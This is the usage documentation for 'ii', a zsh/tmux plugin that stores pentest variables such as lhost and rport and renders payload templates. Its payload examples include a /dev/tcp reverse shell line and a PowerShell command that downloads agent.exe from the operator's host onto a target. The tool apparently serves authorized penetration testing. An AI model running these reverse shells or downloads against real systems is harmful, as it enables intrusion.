# Usage

`ii` stores workflow variables in the current tmux session using the internal
`ii_` namespace. User-facing commands use names without that prefix.

## State Model

```text
tmux session environment = shared source across panes
current shell environment = values directly usable in the current pane
payload renderer = reads current shell first, then tmux session values
```

`ii s` writes to tmux and exports the value into the current shell. `ii l` loads
tmux values into the current shell later. `ii p` and `ii p --input` share the
same render rules: a non-empty lowercase shell variable wins first, then the
matching tmux `ii_` variable is used. This allows one-command shell overrides
while preserving tmux as the shared fallback across panes.

## Commands

| Command | Short form | Purpose |
| --- | --- | --- |
| `ii set NAME=VALUE` | `ii s NAME=VALUE` | Set internal `ii_name` in tmux and export the configured shell name in this shell |
| `ii set NAME VALUE` | `ii s NAME VALUE` | Set one variable from explicit CLI arguments |
| `ii set NAME=VALUE NAME=VALUE` | `ii s:NAME=VALUE,NAME=VALUE` | Set multiple variables with `=` |
| `ii set NAME[,NAME...] --from-shell` | `ii s:NAME[,NAME...] --from-shell` | Save current shell variables back into tmux |
| `ii set --from-shell -a` | `ii s --from-shell -a`, `ii sha` | Save every non-empty default shell variable into tmux |
| `ii set --from-file [PATH]` | `ii s --from-file [PATH]`, `ii sf [PATH]` | Import variables from PATH, defaulting to `.env` in the current directory |
| `ii set -d [INTERFACE]` | `ii s -d`, `ii s:lhost -d [INTERFACE]` | Detect lhost from an interface, defaulting to `tun0` |
| `ii set rhost=VALUE` | `ii s:rhost=VALUE` | Set rhost and automatically detect lhost when enabled |
| `ii set rhost=VALUE` | `ii sr VALUE` | Set only rhost and run the same optional lhost auto-detection |
| `ii get FILTER` | `ii g FILTER`, `ii g:FILTER`, `ii gr` (rhost), `ii gl` (lhost) | Copy and print one tmux variable value without loading |
| `ii load` | `ii l` | Load tmux variables into this shell without the internal `ii_` prefix |
| `ii load --all-pane` | `ii la` | Review panes in the current window, then load the selected shells |
| `ii clip backend` | `ii clipboard backend` | Show or set clipboard backend |
| `ii clip doctor` | `ii clipboard doctor` | Diagnose clipboard behavior and suggest a backend |
| `ii interactive` | `ii i` | Select variable names with fzf, preview values, edit, add, and copy values |
| `ii ls [PATTERN]` | `ii list`, `ii variable`, `ii vars`, `ii var` | List non-empty tmux variables as key/value blocks, optionally filtered by key |
| `ii v [PATTERN]` | | List variables using the same behavior as `ii ls` |
| `ii v --out [PATH]` | `ii vo [PATH]`, `ii voc [PATH]` | Write non-empty variables to a shell-sourceable `.env` file |
| `ii payload [CATEGORY]` | `ii p [CATEGORY]` | Select, render, print, and optionally write a payload |
| `ii p KEYWORD [...]` | | Join all keywords into the initial payload fuzzy-search query |
| `ii p --copy [KEYWORD ...]` | `ii pc [KEYWORD ...]` | Open the selector with an initial query and copy the reviewed selection |
| `ii p --execute [KEYWORD ...]` | `ii pe [KEYWORD ...]` | Select, confirm, and execute a rendered payload in the current shell |
| `ii p --copy --execute [KEYWORD ...]` | `ii pce [KEYWORD ...]` | Select, confirm, copy, and execute a rendered payload in the current shell |
| `ii p --input [-o [PATH]]` | | Render pasted input and optionally write it |
| `ii p --input --copy [-o [PATH]]` | `ii pic [-o [PATH]]` | Render pasted input and always copy it |
| `ii p --input --execute [-o [PATH]]` | `ii pie` | Render input, confirm, and execute without copying |
| `ii p --input --copy --execute [-o [PATH]]` | `ii pice` | Render input, confirm, copy, and execute it in the current shell; `pice` accepts no arguments |
| `ii p -w file PATH` / `ln SOURCE_PATH [LINK_NAME]` / `ls` / `search [FILTER]` | | Render/link, link, list, or search below the configured web root |
| `ii unset NAME [...]` | `ii u NAME [...]` | Remove `ii_` variables from tmux and this shell |
| `ii unset -a` | `ii u -a` | Prompt, then remove all `ii_` variables from the current tmux session |
| `ii tmux status` | | Diagnose the native tmux `:ii` command alias |
| `ii version` | `ii -v`, `ii --version` | Show installed version |
| `ii help [COMMAND]` | `ii h`, `ii -h`, `ii --help` | Show help |

## Basic Workflow

Run inside tmux:

```zsh
ii s lhost 192.168.45.192
ii s lport 443
ii s domain example.test
ii s usert=alice
ii s passt=secret

ii ls
ii ls host
ii ls usert
ii p linux
```

`ii_` is only an internal tmux namespace. User input is normalized to lowercase,
so `user2` and `USER2` refer to the same tmux variable, `ii_user2`. Shell
exports use names without the prefix. By default, `ii set` and `ii load` export
lowercase shell names such as `$lhost` and `$domain`.

Set `II_EXPORT_CASE` to change shell export behavior:

```zsh
export II_EXPORT_CASE=lower  # default: lhost
export II_EXPORT_CASE=upper  # LHOST
export II_EXPORT_CASE=both   # lhost and LHOST
```

## Configuration

`ii` reads this config file automatically when it exists:

```text
~/.config/ii/ii.conf
```

Use it for stable preferences such as shell export case, ANSI color policy, and
the `/www` helper root:

```zsh
export II_EXPORT_CASE=lower
export II_COLOR=auto
export II_AUTO_DETECT_LHOST=1
export II_AUTO_DETECT_LHOST_INTERFACE=tun0
export II_WWW_ROOT=/www
```

`II_COLOR` accepts `auto`, `always`, or `never`. Auto mode colors terminal and
ANSI-aware selector output without adding escape sequences to ordinary pipes
or redirects. A non-empty standard `NO_COLOR` variable disables color
regardless of `II_COLOR`.

To use a different config path, set `II_CONFIG_FILE` in `.zshrc` before loading
the plugin:

```zsh
export II_CONFIG_FILE="$HOME/.config/ii/work.conf"
source "$HOME/.config/zsh/plugin/ii/ii.plugin.zsh"
```

See [doc/conf/ii.conf](conf/ii.conf) for a complete example.

## Variables

Default names that have not been assigned values are not exported into the
shell.

Default variable names:

```text
domain
lhost
rhost
lport
rport
user1
pass1
user2
pass2
user3
pass3
user4
pass4
user5
pass5
cuser
cpass
tuser
tpass
directs
```

Use either explicit `NAME VALUE` arguments for one variable or `NAME=VALUE`
assignments. Multiple assignments use `=`:

```zsh
ii s usert=alice
ii set usert=alice passt='S3cret!'
ii s:usert=alice,passt='S3cret!'
ii s:rhost=192.168.201.175
```

An empty value is equivalent to unset. Every set path removes the tmux entry
and the configured variable from the caller shell when its resolved value is
empty; this includes explicit assignments, `--from-shell`, `--from-file`, and
interactive add/edit.

When `II_AUTO_DETECT_LHOST` is enabled, setting `rhost` or `rhosts` also detects
`lhost` from `II_AUTO_DETECT_LHOST_INTERFACE` and prints
`lhost has automatically sets as VALUE`. The default is enabled on `tun0`.
Set `II_AUTO_DETECT_LHOST=0` to manage `lhost` manually.

Use `--from-shell` to save existing shell variables back into tmux:

```zsh
usert=alice passt='S3cret!' ii s:usert,passt --from-shell
ii s:usert --from-shell
```

`--from-shell` checks the lowercase shell name first, then the uppercase name.
Missing shell variables print a red warning and are skipped.

`ii s --from-shell -a`, or `ii sha`, checks the complete default-name list instead of taking
names. It imports and prints only defaults with a non-empty lowercase or
uppercase shell value, preferring lowercase. Unset and empty defaults are
silently skipped. Arbitrary non-default shell variables are not imported.

Use `ii s --from-file [PATH]`, or `ii sf [PATH]`, to import `NAME=VALUE` entries from a dotenv file.
PATH defaults to `.env` in the current directory. Blank lines, `#` comments, an
optional `export ` prefix, unquoted values, and single-line single- or
double-quoted values are supported. Multiline dotenv values are not supported.
The file is parsed as data and is never sourced or evaluated. Each imported
variable is written to tmux, exported into the current shell, and printed in the
same style as `--from-shell`. Missing or unreadable files and malformed entries
are reported on stdout.

`ii l` is an explicit one-time load from tmux into the current shell. There is
no prompt-time background synchronization. Other panes retain their local
values until they run `ii l` or receive an explicit `ii la` dispatch.

`ii load --all-pane`, or `ii la`, opens a multi-select prompt for every pane in
the current tmux window. Alive zsh panes that are not in a tmux mode are
preselected and labeled `likely ready`; this is a best-effort hint, not a
guarantee that the prompt has no partial input. Space toggles a pane, Enter
confirms, and Esc or q aborts. The current pane loads directly. Other selected
panes receive the fixed command `ii l` followed by Enter, so they must already
have the plugin loaded. The final summary distinguishes local loads,
dispatched commands, user skips, and failures; `dispatched` confirms delivery,
not successful execution in the destination shell.

Use inline assignments for local values that should be saved back explicitly:

```zsh
usert=alice ii s:usert --from-shell
```

Local edits remain local until `--from-shell` saves them into tmux.

`ii g FILTER` uses case-insensitive name matching and the common single-letter
name shortcuts. It copies the selected value through the clipboard layer and
prints it, but it does not modify variables or load values into the shell.
Multiple matches open a prompt; Enter or Space selects and copies one value,
while `q`, Esc, or Ctrl-C aborts without changing variables or copying anything.

`ii ls PATTERN` filters by key name, case-insensitively:

```zsh
ii ls host
ii ls usert
ii ls l
```

### Variable Output

`ii ls` prints only non-empty tmux variables. Empty default names are hidden, so
the list stays focused on values that are actually set.

Each variable is printed as a compact two-line block:

```text
lhost
192.168.45.192
lport
443
```

In an interactive terminal, the key line is blue and the value line uses normal
text. Entries are not separated by blank lines. This keeps copy-mode scanning
dense while still making variable names visually distinct from values.

`ii ls PATTERN` uses the same output format after filtering by key name.

### Variable File Output

`ii v --out` writes all non-empty tmux `ii_` variables to `.env` in the current
directory. `ii vo` is the short alias; `ii voc` remains available for
compatibility. Pass one path to write elsewhere:

```zsh
ii v --out
ii v --out ./target.env
ii vo ./target.env
source ./.env
```

Names are lowercase without the internal `ii_` prefix. Values use shell-safe
single-quote escaping, so spaces, quotes, and shell metacharacters remain data
when the file is sourced. If an existing file contains variables absent from
the current tmux output, `ii` prompts before the file is reduced:

- `c` (cover) replaces it with only the current variables.
- `y` (keep) updates current variables and retains the extra existing ones.
- `n`, EOF, or any other response aborts without changing the file.

If no variables would be removed, output proceeds without prompting. Successful
writes replace the file atomically.

## Interactive Variables

`ii i` shows common variable names even when they do not have values yet. The
fzf list shows names with a one-line value preview. Variables with values are
listed before empty default names, so the cursor starts near active entries.
The selected value appears in a compact bottom preview.

Keys:

| Key | Action |
| --- | --- |
| `j` / `k` | Move selection |
| `/` | Enter search mode |
| `Esc` | Return from search mode to normal mode |
| `i` / `l` | Edit the selected variable |
| `Enter` | Copy the selected value and close |
| `y` | Copy the selected value without closing |
| `h` / `q` / `Ctrl-C` | Abort |

Aborting while editing preserves the original value. A value is replaced only
after confirming with Return. Edit prompts show Return to save or continue, and
Esc to abort. Clearing a value and confirming unsets it.

`ii i` does not load variables into the shell. Use `ii l` to load all non-empty
variables into the current shell.

## Payloads

### Render Rules

Payload files and pasted input use the same renderer.

Renderable placeholders:

```text
%name%
$name
${name}
${name:t}
```

Renderable names normalize to lowercase variable identity. For example,
`$rhost` and `${rhost}` both resolve as `rhost` / tmux `ii_rhost`.

Resolution order:

1. Non-empty lowercase shell variable in the current command context.
2. Non-empty tmux session variable in the internal `ii_` namespace.
3. Keep the original token unchanged.

Shell-sourced values are reported in blue. Tmux/ii-sourced values are reported
with normal text. Missing values are kept as their original tokens and reported
in red.

Uppercase forms such as `%RHOST%`, `$RHOST`, and `${RHOST}` are not rendered.
Legacy `${II_RHOST}` and bare `II_RHOST` forms are also left unchanged.
PowerShell scope variables such as `$env:`, `$script:`, `$global:`, `$local:`,
and `$private:` are also left unchanged.

### Payload Files

Payload files are plain text templates under `II_PAYLOAD_DIR`.

Example:

```text
payloads/
  shell/
    linux/
      sh-tcp
      bash-tcp
      nc-mkfifo
    windows/
      powershell-rev
  script/
    config/
      hosts
    tool/
      ii/
        detect-lhost
      nmap/
        nmap
  xss/
    basic-alert
```

Payload files use lowercase placeholders:

```text
/bin/sh -i >/dev/tcp/${lhost}/${lport} 2>&1 0>&1
sudo nmap -p- -Pn -T4 $rhost
```

Files under `payloads/script/` are for custom scripts. They may use lowercase
variables such as `%rhost%`, `$rhost`, `${file}`, and `${file:t}`.

Combo payloads are multi-stage script payloads under `payloads/script/combo/`.
Use names like `payloads/script/combo/trans/powercat-K2T-TLKC`, where `K2T`
means Kali sends to target and `TLKC` means target listens while Kali connects. See
[payload-schema.md](payload-schema.md) for the combo naming table and stage
metadata convention.

Legacy combo payloads may use presentation-only `# stage:` metadata. Executable
combos opt in with `# flow: 1` and give every stage a lane and confirmation rule:

```text
# flow: 1
# stage: powershell | Receive file to TEMP
# lane: remote-transfer
# advance: confirm
```

Selecting an executable combo with `e`, or through `ii pe`, opens the workflow
popup. It assigns each named lane to a distinct pane, previews every stage, and
sends confirmed stages in file order. Workflow execution never falls back to
local `eval`.

Payload files use a small plain-text schema:

```text
# description: optional operator-facing description
payload body with %name%, $name, ${name}, or ${name:t} placeholders
```

For documentation and tooling, the logical payload object includes `$schema`,
`path`, `description`, `stages`, `source_body`, `emitted_body`, and
`variables`. See [payload-schema.md](payload-schema.md).

`ii p` uses the shared render rules above. A first-line `# description: ...`
metadata line is shown in preview but omitted from copied, printed, and written
output.

The payload selector list shows payload paths only. The selected payload
preview reserves a description block above the template body, highlights
renderable tokens with values in green, highlights missing renderable tokens in
red, leaves uppercase and legacy `II_` payload tokens unchanged, and shows
selector controls and copy status at the bottom of the preview. The bottom
controls use a compact borderless layout with no outer padding and wrap only
between complete action units.

In the selector, `j` and `k` move between payloads. `/` enters search mode and
Esc returns to normal mode. `y` copies the selected rendered payload and closes
the selector. In normal mode, `e` executes the rendered payload in the current
shell. `l` unfolds the selected script into a full preview and
hides the filter input. `j` and `k` still move between scripts, Enter renders
and outputs, and `q` aborts. `h` returns to compact normal mode.

All positional arguments after `ii p` are joined with spaces and used as the
initial fzf query. A single established category name retains category filtering:

```zsh
ii p linux
ii p power shell reverse
```

`ii pc` and `ii p --copy` join all keywords into the selector's initial query.
Review the preview and press `y` to copy:

```zsh
ii pc power shell reverse
ii p --copy power shell reverse
```

For a workflow, copy proceeds one stage at a time and replaces the clipboard
with each confirmed stage. It never flattens mixed-lane commands into one body.

`ii p --execute [KEYWORD ...]` opens the same selector but makes Enter confirm
and execute the selected rendered payload. `ii pe` is its fixed alias.
Adding `--copy`, or using `ii pce`, copies the rendered payload after
confirmation and before execution. The letter `c` always means copy. Execution
uses the current shell rather than a subprocess, so changes to variables, cwd,
functions, and other shell state persist:

```zsh
ii p --execute powercat
ii pce reverse shell
```

After `y`, `ii` prints copy status and the selected payload's render report as
the selector closes. Enter retains the normal render/output behavior. Aborting
without Enter or `y` prints nothing.

Web helpers use the reserved grammar:

```zsh
ii p -w file ./payload.txt
ii p -w ln ./payload.txt
ii p -w ls
ii p -w search payload
```

The helpers use `II_WWW_ROOT` (default `/www`), reject paths outside that
canonical root, never overwrite links, and do not follow symlinks while
listing. The removed `--www` and `www` spellings are invalid payload options
and return status 2.

Write the rendered payload to a file with `-o`:

```zsh
ii p linux -o
ii p linux -o filename
ii p linux -o ./
ii p linux -o ./payload.txt
ii p linux -o /tmp/payload.txt
```

`-o` keeps the normal terminal output. With no path, it writes
`/www/p/att.txt`. A bare filename writes under `/www`, so `-o filename` writes
`/www/filename`. Directory paths use `att.txt`, so `-o ./` writes
`./att.txt`. The terminal output prints the render report first, then the
selected payload path, then the rendered body. When writing a file, `ii` appends
an output note and ends with the full output path on its own line.

### Pasted Input Rendering

Render pasted input without adding a payload file:

```zsh
ii p --input
ii p --input --copy
ii p --input -o
ii p --input -o ./payload.txt
```

In an interactive terminal, `ii p --input` and `ii pic` use Enter to finish,
Alt+Enter to insert a newline, and Esc to cancel. A status line remains below the
edit buffer while the command is waiting:

```text
Enter Finish    Alt-Enter New line    Esc Cancel
```

With bracketed paste, multi-line paste remains one edit buffer and Enter submits
it after the paste completes. Enter `:q` or `:q!` as the complete buffer to
cancel.

Piped input retains the line protocol: a standalone `:w` finishes, while a
standalone `:q` or `:q!` cancels. Both modes use the shared render rules above.
The terminal output prints the render report first, then a `[payload]` marker,
then the rendered body. `--copy` copies only the rendered body.

`ii pice` is the fixed alias for `ii payload --input --copy --execute` and
accepts no positional arguments. It renders input, shows the result, asks
`[y/N]`, copies after confirmation, and executes in the current shell.
Clipboard failure is reported but does not prevent confirmed execution.

### Tmux Popup Input Execution

`ii pie` is the fixed alias for `ii payload --input --execute` and accepts no
positional arguments. It renders input, confirms, and executes without copying.

Loading the plugin inside tmux automatically installs a server-wide native tmux
command alias named `ii`. The `Prefix + :` binding remains untouched. Enter
`ii` in tmux's command prompt to open an isolated popup equivalent to `ii pie`.
Repeated plugin loads are silent and idempotent. `ii tmux status` is read-only
and reports the configuration, alias state, native binding state, and generic
popup helper path.

Set `II_TMUX_INTEGRATION=0` before loading the plugin to skip automatic setup.
If another tmux command alias already owns the name `ii`, ii preserves it and
prints one conflict notice. Set `II_TMUX_INTEGRATION_FORCE=1` to replace only
that conflicting alias.

The tmux execution path is:

```text
popup input -> tmux-variable render -> popup confirmation
-> literal paste to the originating pane -> one final Enter
```

The popup accepts pasted input, uses Enter to finish, Alt+Enter for newlines,
and Esc to cancel.
It does not read an existing tmux buffer as the payload source. Rendering uses
only the current tmux session's `ii_` values and ignores shell-local overrides.
Missing lowercase placeholders remain unchanged and produce an explicit
execute-anyway warning. The popup displays the originating pane and foreground
command; whether that pane is ready to receive a command remains the user's
responsibility. Clipboard failure does not prevent a confirmed pane send.

`-o` writes the rendered body to a file while keeping the normal terminal
output. It follows the same path rules as payload file output, including the
final full-path line.

Use inline assignments for one-command shell overrides:

```zsh
lhost=10.10.14.3 file=/tmp/drop/agent.exe ii p --input --copy
```

`ii l` is a one-time explicit load. Shell-local overrides remain unchanged
until the user runs `ii l`, `ii s`, or another operation that explicitly
updates those names.

Example input:

```text
$KALI = "$lhost"
$FILE = "${file:t}"
Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"
.
```

With `lhost=10.10.14.3` and `file=/tmp/drop/agent.exe`, the rendered body is:

```text
$KALI = "10.10.14.3"
$FILE = "agent.exe"
Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"
```

### Payload Categories

Filter payloads by category:

```zsh
ii p
ii p shell
ii p script
ii p linux
ii p windows
ii p xss
ii p sqli
```

## Payload Directory

The package points `II_PAYLOAD_DIR` to:

```text
${II_PLUGIN_DIR}/payloads
```

Override it only if you keep payloads somewhere else:

```zsh
export II_PAYLOAD_DIR="$HOME/.config/ii/payloads"
```

`II_WWW_ROOT` configures the root used by `ii p -w ...`. Its default is `/www`.

```zsh
export II_WWW_ROOT="$HOME/www"
```
